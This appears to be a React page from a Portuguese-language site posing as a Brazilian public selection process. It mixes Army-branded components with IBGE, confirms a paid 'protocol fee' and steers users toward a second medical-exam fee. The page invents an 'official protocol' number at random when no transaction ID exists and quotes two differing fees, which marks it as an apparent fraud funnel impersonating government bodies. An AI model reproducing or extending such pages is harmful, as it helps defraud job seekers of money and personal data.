import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { CheckCircle, ArrowRight, FileCheck, Calendar, MapPin, Clock, Shield } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { getExamDateFormatted } from '@/utils/examDate';

export default function ConfirmacaoPagamentoPage() {
  const [, setLocation] = useLocation();
  const [candidateName, setCandidateName] = useState('');
  const [transactionId, setTransactionId] = useState('');
  const [examDate, setExamDate] = useState('');
  const [cityName, setCityName] = useState('');
  const { trackEvent } = useClarityEvents();

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Check if user passed through login validation
    const loginValidated = localStorage.getItem('loginValidated');
    if (!loginValidated) {
      setLocation('/login-pos-pagamento');
      return;
    }
    
    // Load user data consistently
    const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
    const pixTransactionData = localStorage.getItem('pixTransaction');
    
    if (userData) {
      try {
        const parsedData = JSON.parse(userData);
        const fullName = parsedData.name || parsedData.nomeCompleto || parsedData.autoFilledData?.nome || '';
        if (fullName) {
          const firstName = fullName.split(' ')[0];
          setCandidateName(firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase());
        }
        // City: try all sources including new flow's examLocation
        let city = parsedData.juntaData?.municipio || parsedData.cidade || parsedData.autoFilledData?.cidade || '';
        if (!city) {
          try {
            const examLocation = parsedData.examLocation || JSON.parse(localStorage.getItem('examLocation') || '{}');
            city = examLocation?.name || '';
          } catch { /* ignore */ }
        }
        setCityName(city || 'sua cidade');
      } catch (error) {
        console.error('Error loading user data:', error);
        setLocation('/login-pos-pagamento');
        return;
      }
    } else {
      setLocation('/login-pos-pagamento');
      return;
    }
    
    if (pixTransactionData) {
      try {
        const pixData = JSON.parse(pixTransactionData);
        setTransactionId(pixData.transactionId || pixData.id || '');
        
        setExamDate(getExamDateFormatted());
      } catch (error) {
        console.error('Error loading transaction data:', error);
      }
    }

    // Track page access
    trackEvent('payment_confirmation_accessed', {
      page: 'confirmacao_pagamento',
      candidate_name: candidateName,
      transaction_id: transactionId,
      timestamp: new Date().toISOString()
    });
  }, []);

  const handleProceedToMedical = () => {
    trackEvent('proceed_to_medical_exam', {
      page: 'confirmacao_pagamento',
      candidate_name: candidateName,
      transaction_id: transactionId,
      timestamp: new Date().toISOString()
    });
    
    setLocation('/agendamento-medico');
  };

  const timelineSteps = [
    {
      icon: <CheckCircle className="w-5 h-5 text-green-600" />,
      title: "Taxa de Protocolo Paga",
      description: "Pagamento confirmado com sucesso",
      status: "completed"
    },
    {
      icon: <FileCheck className="w-5 h-5 text-blue-600" />,
      title: "Exame Médico de Competência Mínima",
      description: "Próximo passo: agendar avaliação médica",
      status: "current"
    },
    {
      icon: <Calendar className="w-5 h-5 text-gray-400" />,
      title: "Prova de Seleção",
      description: `Agendada para ${examDate}`,
      status: "pending"
    },
    {
      icon: <Shield className="w-5 h-5 text-gray-400" />,
      title: "Nomeação",
      description: "Inicio das atividades no IBGE",
      status: "pending"
    }
  ];

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-4xl mx-auto px-6 py-8 pt-0">
        <nav className="text-xs text-gray-500 mb-6" aria-label="Breadcrumb">
          <span className="hover:text-gray-700 cursor-pointer">Home</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="hover:text-gray-700 cursor-pointer">Pagamento</span> 
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-900 font-medium">Confirmação de Pagamento</span>
        </nav>

        {/* Success Header */}
        <header className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4 leading-tight">
            Taxa de Protocolo Confirmada
          </h1>
          {candidateName && (
            <p className="text-lg text-gray-700 leading-relaxed mb-6">
              {candidateName}, sua taxa foi processada com sucesso. Prossiga para as próximas etapas do processo seletivo.
            </p>
          )}
          
          <div className="border-l-4 p-3 mb-6" style={{ borderLeftColor: '#0063AF', backgroundColor: '#EFF6FC' }}>
            <p className="text-sm font-medium" style={{ color: '#0063AF' }}>
              <strong>Protocolo Oficial:</strong> #{transactionId || 'EOPM-' + Math.random().toString(36).substr(2, 9).toUpperCase()}
            </p>
          </div>
        </header>

        {/* Timeline */}
        <article className="mb-8">
          <h2 className="text-xl font-bold text-gray-900 mb-6">Etapas do Processo Seletivo</h2>
          <div className="space-y-4">
            {timelineSteps.map((step, index) => (
              <div key={index} className="flex items-center space-x-3 py-3 border-b border-gray-200 last:border-b-0">
                <div className={`flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center ${
                  step.status === 'completed' ? 'bg-green-100' :
                  step.status === 'current' ? 'bg-blue-100' : 'bg-gray-100'
                }`}>
                  {step.icon}
                </div>
                <div className="flex-1">
                  <h3 className={`text-sm font-medium ${
                    step.status === 'completed' ? 'text-green-800' :
                    step.status === 'current' ? 'text-blue-800' : 'text-gray-600'
                  }`}>
                    {step.title}
                  </h3>
                  <p className="text-xs text-gray-600">{step.description}</p>
                </div>
                {step.status === 'current' && (
                  <ArrowRight className="w-4 h-4 text-blue-600" />
                )}
              </div>
            ))}
          </div>
        </article>

        {/* Medical Exam Info */}
        <article className="mb-8">
          <h2 className="text-xl font-bold text-gray-900 mb-6">Exame médico de competência mínima</h2>
          <p className="text-lg text-gray-700 leading-relaxed mb-4">
            Próxima etapa obrigatória: avaliação médica básica para comprovar aptidão física mínima 
            para atividades administrativas e operacionais simples.
          </p>
          <p className="text-base text-gray-700 leading-relaxed mb-6">
            <strong>Importante:</strong> Não se trata de teste físico intenso, mas de verificação médica 
            das condicoes basicas de saude conforme padroes do IBGE.
          </p>
          
          <div className="grid md:grid-cols-2 gap-6 text-sm text-gray-700">
            <div>
              <h3 className="font-medium text-gray-900 mb-2">Avaliações realizadas:</h3>
              <ul className="space-y-1">
                <li>• Sinais vitais e anamnese</li>
                <li>• Exames visual e auditivo básicos</li>
                <li>• Avaliação de mobilidade geral</li>
                <li>• Verificação de condições gerais</li>
              </ul>
            </div>
            <div>
              <h3 className="font-medium text-gray-900 mb-2">Informações práticas:</h3>
              <ul className="space-y-1">
                <li>• Duração: 30-45 minutos</li>
                <li>• Local: {cityName}</li>
                <li>• Taxa: R$ 147,50 (local)</li>
                <li>• Documentação exigida</li>
              </ul>
            </div>
          </div>
        </article>

        {/* Action Button */}
        <div className="text-center mb-8">
          <button
            onClick={handleProceedToMedical}
            className="px-8 py-3 text-base font-medium text-white rounded transition-colors duration-200"
            style={{ backgroundColor: '#0063AF' }}
            onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#004D8C'}
            onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#0063AF'}
          >
            Prosseguir para Agendamento Médico
          </button>
          <p className="text-xs text-gray-600 mt-2">
            Taxa do exame médico: R$ 147,24 (pagamento no local)
          </p>
        </div>
      </main>

      <ExercitoFooter />
    </div>
  );
}